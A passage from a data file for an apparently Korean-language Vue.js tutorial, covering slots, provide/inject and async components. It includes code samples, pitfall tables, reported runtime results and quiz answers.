        body: "경우 ㄱ, 모양 고정입니다. 위의 사고입니다. 경우 ㄴ, 슬롯 내용에서 자식 변수를 읽음. 부모 범위라 undefined. 범위 슬롯으로 받기. 경우 ㄷ, 자식 <style scoped>가 슬롯 내용에 안 먹음. 부모 소유. :slotted() 또는 부모 스타일. 경우 ㄹ, v-slot을 컴포넌트에 두고 이름 template 섞음. 컴파일 에러(실제로). #default template. 경우 ㅁ, 이름 슬롯 내용을 template 없이 둠. 암묵적 default로 들어감. <template #name>. 경우 ㅂ, 범위 슬롯의 name을 props로 기대. 예약. 경우 ㅅ, 폴백이 있는데 빈 template을 넘김. 빈 내용이 '있음'으로 보여 폴백 안 나옴. 안 넘기기. 경우 ㅇ, $slots.x로 조건 렌더하는데 부모가 빈 template. 함수가 있어 참. 경우 ㅈ, 슬롯 내용이 매 렌더 평가될 거라 기대해 부수 효과. 자식이 부를 때만(지연). 경우 ㅊ, 렌더리스 컴포넌트로 로직 재사용. 인스턴스 비용. 컴포저블. 경우 ㅋ, 범위 슬롯 props를 자식에서 바꿈. 부모로 간 사본이라 의미 없음. emit. 경우 ㅌ, in-DOM 템플릿에서 #header 축약. 됨(v-slot 축약은 파서 무관). 단 template 태그 안 내용은 파서 규칙.",
        code: "경우               언제 생기나                        겉모습                                                처방\nㄱ 모양 고정        props 로 모양 옵션 폭발               재사용 불가                                           범위 슬롯\nㄴ 자식 변수 읽기     슬롯 내용에서 childState             undefined (부모 범위)                                  <slot :data>\nㄷ scoped 안 먹음    자식 <style scoped>                 슬롯 내용 미적용                                       :slotted() · 부모 스타일\nㄹ v-slot 혼합       <Comp v-slot=\"x\"><template #a>      Mixed v-slot usage on both the component and nested <template>…   <template #default=\"x\">\nㅁ template 없음     이름 슬롯 내용을 바로                 default 로 들어감                                      <template #name>\nㅂ name prop 기대    #item=\"{ name }\"                   undefined (예약)                                      다른 이름\nㅅ 빈 template      <template #x></template>            폴백 안 나옴                                          안 넘김\nㅇ $slots 조건       빈 template 도 truthy                렌더됨                                               내용 검사\nㅈ 즉시 평가 기대    슬롯 안 부수 효과                     자식이 부를 때만                                        -\nㅊ 렌더리스 남발     로직만인데 컴포넌트                   인스턴스 비용                                          컴포저블\nㅋ 슬롯 props 변경   자식 데이터 사본 변경                 부모 무관                                             emit\nㅌ in-DOM 축약      #header in HTML                    됨                                                   -",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 슬롯은 '부모가 쓴 함수를 자식이 부르는 것' 이고, 범위 슬롯은 그 함수의 인자다",
        body: "컴파일된 모양이 전부를 설명합니다. 부모가 넘긴 슬롯 내용은 { default: () => vnodes, header: () => vnodes, item: (props) => vnodes } 함수 객체입니다. 함수는 부모 템플릿에서 만들어졌으니 부모 범위를 닫아 둔 클로저이고(ㄴ, ㄷ), 자식이 slots.name()을 부를 때 평가되며(ㅈ), 부르지 않으면 폴백이 대신입니다(ㅅ, ㅇ). 범위 슬롯은 자식이 그 함수에 인자를 넘기는 것이라 데이터가 자식 → 부모로 가고(ㄱ, ㅋ), name은 함수 이름이라 인자가 아닙니다(ㅂ). 여러 슬롯을 넘길 때 어느 함수의 인자인지 모호해지는 자리를 컴파일러가 막습니다(ㄹ). 처방은 슬롯을 'props 대신 모양을 넘기는 함수'로 보고, 자식은 데이터와 자리를, 부모는 모양을 맡기는 것입니다.",
        code: "부모:  <Card><template #item=\"{ user }\">…</template></Card>\n  ≡  h(Card, null, { item: ({ user }) => […부모 범위의 vnode…] })      ← 부모 범위 클로저 (ㄴ ㄷ)\n자식:  <slot name=\"item\" :user=\"u\">폴백</slot>\n  ≡  slots.item ? slots.item({ user: u }) : 폴백                           ← 부를 때 평가 (ㅈ) · 인자 = 범위 슬롯 props (ㄱ ㅋ) · name 은 함수 이름 (ㅂ)\n\n자식 = 데이터 + 자리 · 부모 = 모양",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "깊은 자손에 값을 전달할 때 props를 단계마다 내리는 대신 건너뛰는 것이 다음 페이지 'Provide / inject'입니다. 실제로 돌려 보면 ref를 provide하면 자식이 갱신됐고, readonly로 감싼 것에 자식이 쓰면 경고였고, Teleport 안에서도 inject가 됐습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) <DataTable :rows>가 열마다 셀 모양을 바꿀 수 있어야 합니다(날짜 포맷, 링크, 배지). 슬롯 설계는? (2) 부모가 셀 슬롯 안에서 <Badge>를 쓰는데 DataTable의 <style scoped> .cell이 Badge에 안 먹습니다. 왜고 어떻게? (3) 헤더 슬롯이 없을 때 헤더 영역의 여백까지 없애려 합니다. 어떻게?",
        notes: [
          {
            title: "답",
            body: "(1) 열마다 이름 범위 슬롯을 둡니다. <td v-for=\"col in columns\"><slot :name=\"`cell-${col.key}`\" :row=\"row\" :value=\"row[col.key]\">{{ row[col.key] }}</slot></td>. 동적 슬롯 이름으로 cell-date, cell-link처럼 열 키마다 자리를 만들고 폴백은 값 그대로. 부모는 <template #cell-date=\"{ value }\">{{ fmt(value) }}</template>처럼 필요한 열만 정합니다. 데이터(row, value)는 자식 → 부모로 가고 모양은 부모 범위입니다. (2) 슬롯 내용은 부모 소유라 자식의 scoped 스타일이 적용되지 않습니다(문서: 슬롯 내용은 부모 범위). DataTable이 슬롯 내용을 스타일하려면 <style scoped>에서 :slotted(.badge)를 쓰거나, 부모가 자기 스타일로 꾸밉니다. (3) 자식에서 <div v-if=\"$slots.header\" class=\"header\"><slot name=\"header\" /></div>로 슬롯 함수가 있는지 검사해 영역 자체를 조건부로 렌더합니다. 부모가 <template #header></template>처럼 빈 template을 넘기면 함수는 있어 참이 되니, 그 경우까지 막으려면 $slots.header()의 결과가 비었는지 보는 헬퍼가 필요합니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Slots", href: `${DOCS}/guide/components/slots` },
      { label: "<slot> (Special Elements)", href: `${DOCS}/api/built-in-special-elements#slot` },
      { label: "SFC CSS Features — :slotted()", href: `${DOCS}/api/sfc-css-features#slotted-selectors` },
    ],
  },

  {
    id: "vg-comp-provide",
    name: "Provide / inject",
    tagline: "조상이 provide 한 것을 자손이 inject 한다 — 깊이 무관, setup 중 동기로, 변경은 제공자가",
    intro:
      "컴포넌트 심화 일곱째 페이지입니다. 깊은 자손에 값을 내리려면 중간 컴포넌트가 쓰지도 않는 prop을 통과시켜야 하는 'prop drilling'이 생깁니다. provide/inject는 조상이 provide(key, value)하고 자손이 inject(key)로 받아 중간을 건너뜁니다. 규칙: setup 중 동기로 호출. 앱 수준 app.provide도 됨(플러그인). inject의 기본값: inject('key', 'default') 또는 팩토리 inject('key', () => new Expensive(), true). 반응성: ref를 provide하면 자손도 반응형으로 읽고, '변경은 제공자 안에 두고' 자손에는 변경 함수를 함께 provide하거나 readonly()로 감쌉니다. 키는 Symbol로 충돌을 피합니다(라이브러리 권장). 실제로 돌려 보면 ref를 provide한 자식은 값이 바뀌자 갱신됐고, readonly(count)를 inject한 자식이 .value++를 하니 'Set operation on key \"value\" failed: target is readonly.' 경고였고, Teleport로 다른 DOM 자리에 간 자식도 부모의 provide를 inject했고, 서버 렌더에서도 inject('msg', '기본값')가 '주입됨'을 받았습니다. 이 노드의 질문은 하나입니다. 어디서 주고 어디서 받으며, 누가 바꾸나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "제공: <script setup> import { provide } from 'vue'; provide('message', 'hello!'). 키는 문자열이나 Symbol, 값은 무엇이든(ref 포함). 보통 <script>면 setup() 안에서 동기로. 앱 수준: app.provide('message', 'hello!')는 모든 컴포넌트에. 주입: const message = inject('message'). 조상 체인에서 가장 가까운 제공자. 없으면 undefined와 경고. 기본값: inject('message', 'default value'). 비싼 값은 팩토리 inject('key', () => new ExpensiveClass(), true)(셋째 인자 true가 '함수를 팩토리로 다루라'). Options API: provide: { message: 'hello' } 또는 함수 provide() { return { message: this.message } }(this 접근용. 반응형은 아님. computed(() => this.message)로). inject: ['message'] 또는 객체 { localName: { from: 'message', default: 'x' } }. 주입은 자기 상태보다 먼저 해석되어 data()에서 쓸 수 있음. 반응성: 'ref를 provide하면 그대로(풀리지 않음) 주입되어 반응형 연결 유지'. '변경은 제공자 안에'. 자손에서 바꿔야 하면 변경 함수를 함께 provide: provide('location', { location, updateLocation }). 막으려면 provide('read-only-count', readonly(count)). Symbol 키: export const myInjectionKey = Symbol()을 공유 파일에서 export해 provide(myInjectionKey, …)/inject(myInjectionKey). TS는 InjectionKey<T>.",
        code: "// keys.ts\nexport const ThemeKey = Symbol() as InjectionKey<{ theme: Ref<string>; setTheme: (t: string) => void }>\n\n// 조상 (Provider)\n<script setup>\nconst theme = ref('light')\nfunction setTheme(t) { theme.value = t }                    // 변경은 여기\nprovide(ThemeKey, { theme: readonly(theme), setTheme })     // 읽기 전용 + 변경 함수\n</script>\n\n// 자손 — 깊이 무관\n<script setup>\nconst { theme, setTheme } = inject(ThemeKey)!                 // setup 중 동기\nconst msg = inject('message', 'default')                     // 기본값\nconst cfg = inject('config', () => loadConfig(), true)        // 팩토리 (셋째 인자 true)\n</script>\n\n// 앱 수준 (플러그인)\napp.provide('i18n', options)\n\n// Options API\nexport default { provide() { return { message: computed(() => this.message) } }, inject: { local: { from: 'message', default: 'x' } } }",
        terms: [
          {
            term: "prop drilling",
            body: "깊은 자손이 쓸 값을 중간 컴포넌트들이 쓰지도 않으면서 props로 받아 다시 내려 주는 일입니다. 중간 컴포넌트의 인터페이스가 자기와 무관한 prop으로 오염되고, 한 단계만 빠뜨려도 끊깁니다. provide/inject는 조상과 자손 사이를 직접 이어 중간을 건너뜁니다. React의 Context와 같은 자리입니다. 같은 키를 여러 조상이 provide하면 가장 가까운 것이 이깁니다.",
          },
          {
            term: "주입 컨텍스트 (injection context)",
            body: "inject()가 '지금 어느 컴포넌트의 조상 체인을 봐야 하나'를 아는 상태입니다. setup() 실행 중과 <script setup>, 그리고 app.runWithContext(fn) 안에서만 유효합니다. 그 밖(setTimeout, 이벤트 핸들러, 보통 함수)에서 inject를 부르면 경고와 undefined입니다. 3.3+ hasInjectionContext()로 미리 검사할 수 있어 라이브러리가 씁니다. 라이프사이클 훅의 '동기 등록'과 같은 구조입니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 부모가 provide('count', count)(ref), provide('plain', plain)(보통 객체), provide('ro', readonly(count))를 하고 자식이 inject해 그렸습니다. count.value = 1 뒤 자식은 '1 1 1'로 갱신됐습니다(ref는 반응형 연결 유지. plain 객체의 변경은 추적되지 않지만 같은 갱신에 묻어 그려짐). 자식이 ro.value++를 하니 '[Vue warn] Set operation on key \"value\" failed: target is readonly.'이고 값은 그대로. Teleport로 #modal-target에 간 Inner가 inject('msg')로 부모의 '부모가 provide'를 받았습니다. DOM 위치와 무관하게 논리 트리의 조상 체인을 봅니다. Node의 SSR에서 부모가 provide('msg', '주입됨'), 자식이 inject('msg', '기본값')하니 <p>주입됨</p>. 서버에서도 동작합니다. 3.5의 useId도 함께 _R_… 대신 'v-0' 꼴로 나왔습니다. 플러그인이 app.provide로 넣은 값은 어느 컴포넌트에서든 inject로 받습니다(플러그인 노드).",
        code: "// Chrome 156\nprovide('count', ref) · provide('plain', {}) · provide('ro', readonly(count))\ncount.value = 1 → 자식 '1 1 1'  (ref 반응 유지)\n자식 ro.value++ → [Vue warn] Set operation on key \"value\" failed: target is readonly.\nTeleport 안 Inner.inject('msg') → '부모가 provide'   (DOM 위치 무관 · 논리 트리)\n\n// Node — SSR\nprovide('msg', '주입됨') · 자식 inject('msg', '기본값') → <p id=\"v-0\">주입됨</p>",
      },
      {
        label: "문제: 자손이 inject 한 값을 바꿨는데 다른 자손은 모른다",
        body: "조상이 provide('user', { name: 'a' })로 보통 객체를 주고, 자손 A가 user.name = 'b'로 바꿨습니다. 자손 B의 화면은 'a'입니다. 보통 객체는 반응형이 아니라 변경이 추적되지 않습니다(실제로 plain 객체 변경은 다른 갱신에 묻어서만 그려짐). 그리고 자손이 직접 바꾸면 '어디서 바뀌었나'를 조상이 모릅니다. 처방은 둘입니다. 반응형으로 provide(ref나 reactive)하면 변경이 모든 주입처에 전파됩니다(실제로 ref는 갱신). 그리고 문서의 권고대로 '변경은 제공자 안에' 둡니다. provide('user', { user: readonly(user), setName })처럼 읽기 전용 값과 변경 함수를 함께 주면 자손은 setName으로 요청하고 조상이 바꿉니다. 자손이 readonly를 직접 쓰면 경고로 막힙니다(실제로 확인).",
      },
      {
        label: "문제가 나는 경우: 컨텍스트와 반응성을 모를 때",
        body: "경우 ㄱ, 보통 객체 provide + 자손 변경입니다. 위의 사고입니다. 경우 ㄴ, setup 밖(setTimeout·핸들러)에서 inject. 컨텍스트 없음, 경고·undefined. setup에서 받아 변수에. 경우 ㄷ, 키 없이 inject하고 기본값도 없음. undefined + 'injection \"x\" not found' 경고. 기본값 또는 required 검사. 경우 ㄹ, 팩토리 함수를 셋째 인자 없이. 함수 자체가 값. true 추가. 경우 ㅁ, 문자열 키 충돌(라이브러리 둘이 'theme'). 가까운 것이 이김. Symbol 키. 경우 ㅂ, Options provide 객체에 this. 함수 꼴로. 반응형은 computed로. 경우 ㅅ, inject한 ref를 템플릿에서 .value 없이 못 쓴다고 생각. 최상위 ref는 풀림. 경우 ㅇ, 자손이 readonly 값을 바꾸려 함. 경고(실제로). 변경 함수. 경우 ㅈ, provide 값을 나중에 재할당(provide('x', a); a = b). 주입처는 옛 참조. ref.value 교체. 경우 ㅊ, 형제 간 공유를 provide로 기대. 조상 → 자손만. 공통 조상에서 provide 또는 스토어. 경우 ㅋ, 앱 전체 상태를 전부 provide로. 출처 추적 어려움. 스토어(Pinia). 경우 ㅌ, Teleport·슬롯 안이라 inject가 안 될 거라 걱정. 논리 트리 기준(실제로 됨). 경우 ㅍ, 같은 컴포넌트에서 provide하고 inject. 자기 것은 못 받음(조상만). 변수 직접.",
        code: "경우               언제 생기나                        겉모습                                          처방\nㄱ 보통 객체 변경     provide({}) + 자손 수정              다른 자손 갱신 안 됨                             ref/reactive + 변경 함수\nㄴ 밖에서 inject     setTimeout 안                       경고 · undefined                               setup 에서\nㄷ 키 없음          inject('x') 제공자 없음               injection \"x\" not found · undefined             기본값 · 검사\nㄹ 팩토리 미표시     inject('k', () => v)                 함수가 값                                      (…, true)\nㅁ 문자열 충돌       두 라이브러리 'theme'                 가까운 것 승                                    Symbol\nㅂ Options this     provide: { x: this.x }               undefined                                    provide() { … }\nㅅ .value 걱정      템플릿 {{ injected }}                 풀림 (됨)                                     -\nㅇ readonly 쓰기     ro.value++                          Set operation on key \"value\" failed: target is readonly.   변경 함수\nㅈ 재할당           provide 뒤 변수 교체                  옛 참조                                        ref.value\nㅊ 형제 공유        A provide → B inject                 안 됨 (조상→자손)                               공통 조상 · 스토어\nㅋ 전부 provide      전역 상태 전부                        출처 추적 어려움                                 Pinia\nㅌ Teleport 걱정     이동한 자식                           됨 (실제로)                                   -\nㅍ 자기 inject       같은 컴포넌트                         못 받음                                       변수",
        codeLang: "text",
      },
      {
        label: "문제의 구조: provide/inject 는 '논리 트리의 조상 체인' 을 따라 내려오는 통로이고, 반응성과 소유권은 따로 챙겨야 한다",
        body: "통로의 모양: 자손이 inject(key)를 부르면 자기 조상 체인을 위로 올라가 가장 가까운 provide(key)를 찾습니다. 기준은 DOM이 아니라 컴포넌트 트리라 Teleport·슬롯 안에서도 되고(ㅌ), 형제·자기 자신은 체인 밖입니다(ㅊ, ㅍ). 체인은 setup 중에만 알 수 있어 동기 호출이고(ㄴ), 찾지 못하면 기본값·팩토리(ㄷ, ㄹ), 이름이 겹치면 가까운 것(ㅁ). 통로는 '참조를 넘길' 뿐이라 반응성은 넘기는 값이 ref·reactive인지에 달리고(ㄱ, ㅈ), 소유권은 통로가 보장하지 않으니 readonly와 변경 함수로 '제공자가 바꾼다'를 코드에 적습니다(ㅇ). 처방은 provide할 값을 { state: readonly(ref), actions }로 묶고 키는 Symbol로, 앱 전체 상태면 스토어로 올리는 것입니다.",
        code: "자손 inject(key) ──조상 체인 위로──▶ 가장 가까운 provide(key)   (논리 트리: Teleport·슬롯 ✓ ㅌ · 형제·자기 ✗ ㅊ ㅍ)\n  setup 중 동기 (ㄴ) · 못 찾으면 기본값·팩토리(true) (ㄷ ㄹ) · 겹치면 가까운 것 (ㅁ)\n통로는 참조만 → 반응성 = 값이 ref/reactive 인가 (ㄱ ㅈ) · 소유권 = readonly + 변경 함수 (ㅇ)\n\nprovide(SymbolKey, { state: readonly(ref), setX })   ·   앱 전체면 스토어",
        codeLang: "text",
      },
      {
        label: "다음 입구",
        body: "컴포넌트 심화의 마지막 페이지 '비동기 컴포넌트'는 컴포넌트 자체를 나중에 받는 것입니다. 실제로 돌려 보면 defineAsyncComponent는 loading → 도착, 실패 시 error, 느리면 timeout을 각각 그렸습니다.",
      },
      {
        label: "확인 질문",
        body: "(1) 폼 라이브러리의 <Form>이 자식 <Field>들에게 등록·검증 함수를 주어야 합니다. props 대신 어떻게? (2) <Field>가 폼의 submitting 상태를 읽어 비활성화해야 하고, 자신이 그 상태를 바꾸면 안 됩니다. 어떻게 provide? (3) 다른 UI 라이브러리도 'form'이라는 키를 provide합니다. 충돌을 피하려면?",
        notes: [
          {
            title: "답",
            body: "(1) Form이 provide(FormKey, { register, unregister, validate })로 함수들을 내리고, Field는 inject(FormKey)로 받아 onMounted에서 register, onUnmounted에서 unregister합니다. Field가 Form의 몇 단계 아래 슬롯 안에 있어도 논리 트리의 조상 체인을 따라 받습니다(실제로 Teleport 안에서도 inject가 됨). 중간 레이아웃 컴포넌트는 아무것도 몰라도 됩니다. (2) Form이 const submitting = ref(false)를 두고 provide(FormKey, { submitting: readonly(submitting), … })로 읽기 전용으로 넘깁니다. Field는 inject한 ref를 템플릿에 :disabled=\"submitting\"으로 쓰면 반응형으로 갱신됩니다(실제로 ref provide는 자식 갱신). Field가 실수로 submitting.value = true를 하면 'Set operation on key \"value\" failed: target is readonly.' 경고로 막힙니다. 변경은 Form이 submit 핸들러에서 합니다. (3) 문자열 'form' 대신 Symbol 키를 쓰고 공유 모듈에서 export합니다. export const FormKey: InjectionKey<FormContext> = Symbol('form'). Symbol은 모듈 정체로 구분되어 다른 라이브러리의 'form'과 겹치지 않고, TS 타입도 InjectionKey로 inject 결과에 붙습니다. 문서가 라이브러리에 권하는 방식입니다.",
            bottom: true,
          },
        ],
      },
    ],
    sources: [
      { label: "Provide / Inject", href: `${DOCS}/guide/components/provide-inject` },
      { label: "provide() · inject()", href: `${DOCS}/api/composition-api-dependency-injection` },
      { label: "app.provide()", href: `${DOCS}/api/application#app-provide` },
    ],
  },

  {
    id: "vg-comp-async",
    name: "비동기 컴포넌트",
    tagline: "컴포넌트 자체를 필요할 때 받는다 — loading·error·timeout, 그리고 3.5 의 지연 하이드레이션",
    intro:
      "컴포넌트 심화 마지막 페이지입니다. 큰 앱은 모든 컴포넌트를 처음에 내려받지 않습니다. defineAsyncComponent(() => import('./Heavy.vue'))는 렌더될 때 로더를 부르는 래퍼 컴포넌트를 만들고, 받는 동안 loadingComponent(delay 기본 200ms 뒤), 실패하면 errorComponent(또는 timeout 초과), onError(error, retry, fail, attempts)로 재시도를 정할 수 있습니다. props와 slots는 안쪽 컴포넌트로 그대로 갑니다. Suspense와 함께 쓰면 '중단 가능(suspensible)'이라 Suspense가 로딩을 맡습니다. 3.5+ SSR에서는 hydrate 옵션으로 하이드레이션 시점을 미룹니다. hydrateOnIdle, hydrateOnVisible, hydrateOnMediaQuery, hydrateOnInteraction, 커스텀. 실제로 돌려 보면 delay: 0에 loadingComponent를 두니 첫 렌더가 'loading…', 120ms 모듈은 'lazy 도착', 500 응답 모듈은 errorComponent에 'Failed to fetch dynamically imported module…', timeout: 50인 것은 'Async component timed out after 50ms.'로 errorComponent, onError는 attempts=1로 불렸습니다. 이 노드의 질문은 하나입니다. 아직 없는 컴포넌트의 자리에 무엇을 그리나.",
    blocks: [
      {
        label: "무엇을 다루나",
        body: "import { defineAsyncComponent } from 'vue'; const AsyncComp = defineAsyncComponent(() => import('./components/MyComponent.vue')). 로더는 Promise를 돌려주는 함수(ESM 동적 import면 번들러가 코드 분할). '실제로 렌더될 때만 로더를 부름'. 등록은 보통 컴포넌트처럼 전역(app.component)·로컬·<script setup> 인라인. props·slots는 안쪽으로 통과. 옵션 객체: { loader, loadingComponent, delay(기본 200. 로딩 컴포넌트를 보이기 전 대기. 빠른 네트워크의 깜빡임 방지), errorComponent, timeout(기본 Infinity. 초과하면 에러 컴포넌트), suspensible, onError(error, retry, fail, attempts) }. 3.5+ 지연 하이드레이션(SSR 전용): hydrate: hydrateOnIdle(timeout?)(requestIdleCallback), hydrateOnVisible({ rootMargin })(IntersectionObserver), hydrateOnMediaQuery('(max-width:500px)'), hydrateOnInteraction('click' | ['wheel','mouseover'])(이벤트가 재생됨), 커스텀 (hydrate, forEachElement) => { …; hydrate(); return teardown }. 전략은 개별 import(트리 셰이킹). Suspense: 비동기 컴포넌트는 기본 suspensible이라 조상 Suspense가 로딩 상태를 맡고 자기 loading/error 옵션은 무시. suspensible: false로 끄기.",
        code: "import { defineAsyncComponent, hydrateOnVisible } from 'vue'\n\n// 기본\nconst Heavy = defineAsyncComponent(() => import('./Heavy.vue'))        // 렌더될 때 로드 · 번들 분할\n\n// 옵션\nconst Chart = defineAsyncComponent({\n  loader: () => import('./Chart.vue'),\n  loadingComponent: LoadingSpinner,   // delay 뒤에 보임\n  delay: 200,                          // 기본 200ms — 빠르면 스피너 안 보임\n  errorComponent: ErrorBox,            // 실패 또는 timeout\n  timeout: 3000,                       // 기본 Infinity\n  onError(error, retry, fail, attempts) { attempts <= 3 && error.message.match(/fetch/) ? retry() : fail() },\n  hydrate: hydrateOnVisible({ rootMargin: '100px' }),   // 3.5+ SSR: 보일 때 하이드레이션\n})\n\n<template><Suspense><Heavy /></Suspense></template>   <!-- suspensible: Suspense 가 로딩 담당 -->\n<Chart :data=\"d\"><template #legend>…</template></Chart>   <!-- props · slots 통과 -->",
        terms: [
          {
            term: "코드 분할 (code splitting)과 동적 import",
            body: "import('./X.vue')는 모듈을 '지금'이 아니라 '부를 때' 받는 Promise입니다. 번들러(Vite·webpack)는 이것을 보고 X와 그 의존을 별도 청크로 떼어 처음 번들을 작게 만듭니다. defineAsyncComponent는 그 Promise를 컴포넌트 자리에 끼우는 래퍼이고, Vue Router의 라우트 컴포넌트에도 같은 패턴을 씁니다(라우트는 Suspense를 깨우지 않음). JavaScript 노드 13장과 번들링 허브가 이 자리입니다.",
          },
          {
            term: "지연 하이드레이션 (lazy hydration, 3.5+)",
            body: "SSR로 받은 HTML의 일부를 바로 상호작용 가능하게(하이드레이션) 만들지 않고 조건이 될 때까지 미루는 것입니다. 보일 때(hydrateOnVisible), 한가할 때(hydrateOnIdle), 화면 크기(hydrateOnMediaQuery), 사용자가 건드릴 때(hydrateOnInteraction. 그 이벤트는 하이드레이션 뒤 재생). 처음 로드의 JS 실행을 줄입니다. 렌더링 노드 12장의 하이드레이션을 컴포넌트 단위로 미루는 것이고, React의 선택적 하이드레이션과 같은 문제를 다른 축(조건)으로 풉니다.",
          },
        ],
      },
      {
        label: "실제로 돌려 보면",
        body: "Chrome에서 셋을 나란히 두었습니다. Lazy는 loader가 120ms 걸리는 모듈, loadingComponent <i>loading…</i>, delay: 0, errorComponent, timeout 1000. Fail은 500을 돌려주는 모듈 경로, errorComponent가 error prop을 받아 표시, onError에서 attempts를 기록하고 fail(). Timeout은 500ms 모듈에 timeout: 50. 첫 렌더(nextTick) 텍스트는 'loading…'(Lazy의 로딩 컴포넌트. delay 0이라 즉시). 300ms 뒤 'lazy 도착' + 'error: Failed to fetch dynamically imported mod' + 'timeout'. onError 로그는 'onError attempts=1'. console.error에 'Failed to fetch dynamically imported module: http://localhost:4324/mod/fail.js'와 'Async component timed out after 50ms.'가 남고 경고 '[Vue warn]: Unhandled error during execution of async component loader'가 둘. Suspense 안의 async setup(80ms) 컴포넌트는 첫 렌더 '로딩…'(fallback), 150ms 뒤 '비동기 setup 끝', 이벤트 순서 pending → fallback → resolve(내장 컴포넌트 노드). Node의 SSR에서 async setup 컴포넌트를 Suspense로 감싸 renderToString하니 기다려서 <b>비동기 도착</b>이 나왔습니다.",
        code: "// Chrome 156 · 3.5.45\nLazy    { loader 120ms, loadingComponent, delay: 0, timeout: 1000 }   첫 렌더 'loading…' → 300ms 뒤 'lazy 도착'\nFail    { loader → HTTP 500, errorComponent(error) }                   → 'error: Failed to fetch dynamically imported mod…' · onError attempts=1 → fail()\nTimeout { loader 500ms, timeout: 50 }                                  → 'timeout' (errorComponent) · 'Async component timed out after 50ms.'\nwarn ×2: Unhandled error during execution of async component loader\n\n// Suspense + async setup (80ms)\n첫 렌더 '로딩…' → 150ms 뒤 '비동기 setup 끝' · 이벤트 pending → fallback → resolve\n// Node — SSR 은 기다린다\nrenderToString(<Suspense><AsyncChild/></Suspense>) → <b>비동기 도착</b>",
      },
      {
        label: "문제: 배포 직후 사용자에게 'Failed to fetch dynamically imported module' 이 뜬다",
        body: "새 배포로 청크 파일 이름(해시)이 바뀌었는데 열어 둔 탭의 옛 index.js가 옛 청크 이름을 import합니다. 서버에 그 파일이 없어 404, 비동기 컴포넌트가 실패합니다. 실제로 돌려 보면 실패한 import는 errorComponent로 가고 onError가 불렸습니다. 처방은 세 겹입니다. onError에서 네트워크류 에러는 retry()를 몇 번 시도하고(attempts로 제한), 그래도 안 되면 fail()로 errorComponent에 '새 버전이 있습니다. 새로 고침' 안내를 보입니다. 라우터 수준에서는 라우트 로드 실패 시 location.reload() 한 번. 서버는 옛 청크를 한 배포 주기 동안 남겨 두거나 캐시 헤더로 index.html을 짧게 둡니다. defineAsyncComponent의 로더가 실패하면 그 자리만 에러이고 앱 전체는 살아 있다는 것이 이 설계의 이점입니다.",
      },
      {
        label: "문제가 나는 경우: 자리와 시점을 모를 때",
        body: "경우 ㄱ, 배포 후 청크 404입니다. 위의 사고입니다. 경우 ㄴ, 로딩 컴포넌트가 안 보임. delay 200ms 안에 끝나면 설계상 안 보임. 빠른 로드엔 정상. 경우 ㄷ, 모든 로드에 스피너가 깜빡임. delay 0. 200으로. 경우 ㄹ, 에러 컴포넌트가 안 나옴. timeout 기본 Infinity라 멈춘 네트워크는 영원히 로딩. timeout 설정. 경우 ㅁ, onError에서 retry만 부름. 무한 재시도. attempts 제한 + fail. 경우 ㅂ, Suspense 안인데 loading/error 옵션이 무시됨. suspensible 기본. Suspense가 담당. 끄려면 suspensible: false. 경우 ㅅ, 라우트 컴포넌트를 defineAsyncComponent로 감쌈. Router는 자체 지연 로드(() => import()). 중복. 경우 ㅇ, 로더를 렌더 함수·setup 안에서 매번 만듦. 매 렌더 새 래퍼라 재로드. 모듈 최상위. 경우 ㅈ, 비동기 컴포넌트의 DOM을 부모 mounted에서 기대. 아직 없음. 자식 mounted. 경우 ㅊ, SSR 없는 앱에서 hydrate 옵션. SSR 전용. 경우 ㅋ, hydrateOnInteraction 전 클릭이 사라질까 걱정. 이벤트가 재생됨. 경우 ㅌ, 전략을 import 없이 문자열로. 함수를 import해야(트리 셰이킹). 경우 ㅍ, 작은 컴포넌트까지 전부 비동기. 요청 수 증가·지연. 라우트·큰 것만.",
        code: "경우               언제 생기나                        겉모습                                              처방\nㄱ 청크 404         배포 후 옛 탭                        Failed to fetch dynamically imported module (실제로)   onError retry/fail · reload 안내\nㄴ 스피너 안 보임     200ms 안 완료                       설계                                               -\nㄷ 스피너 깜빡       delay: 0                           빠른 로드에도                                        delay 200\nㄹ 영원한 로딩       timeout 미설정 + 멈춘 망              에러 안 뜸                                          timeout\nㅁ 무한 재시도       onError retry 만                     루프                                               attempts + fail\nㅂ 옵션 무시        Suspense 안                          loading/error 안 쓰임                                 suspensible: false\nㅅ 라우트 중복       Router + defineAsync                 이중 래핑                                           Router 지연 로드만\nㅇ 안에서 생성       setup 안 defineAsync                 매 렌더 재로드                                       모듈 최상위\nㅈ 부모 mounted 기대  비동기 자식 DOM                      없음                                               자식 mounted\nㅊ CSR 에 hydrate    SSR 아님                            무의미                                              -\nㅋ 상호작용 유실 걱정  hydrateOnInteraction                 재생됨                                              -\nㅌ 전략 문자열       hydrate: 'visible'                  안 됨                                              import 함수\nㅍ 전부 비동기       작은 컴포넌트까지                      요청 폭증                                           큰 것만",
        codeLang: "text",
      },
      {
        label: "문제의 구조: 비동기 컴포넌트는 '컴포넌트 자리의 상태 기계' 이고, 상태마다 무엇을 그릴지 정한다",
        body: "defineAsyncComponent가 만드는 래퍼는 네 상태를 가집니다. 대기(delay 전, 아무것도 안 그림 ㄴ, ㄷ) → 로딩(loadingComponent) → 도착(안쪽 컴포넌트, props·slots 통과) 또는 실패(errorComponent. 로더 거부 또는 timeout ㄹ). 실패에서 onError가 retry(→ 로딩)와 fail(→ 실패)의 분기를 맡습니다(ㅁ, ㄱ). Suspense 안에서는 이 상태 기계를 Suspense가 가져가고(ㅂ), Router는 자기 것이 있습니다(ㅅ). 래퍼는 한 번 만들어 재사용해야 상태가 유지됩니다(ㅇ). 3.5의 hydrate는 SSR에서 '도착'은 됐지만 '살아나는' 시점을 조건에 거는 다섯째 상태입니다(ㅊ, ㅋ, ㅌ). 처방은 상태마다 그릴 것(스피너·에러·재시도 안내)을 정하고, timeout과 attempts로 무한 상태를 막고, 분할 단위를 라우트·큰 컴포넌트로 잡는 것입니다.",
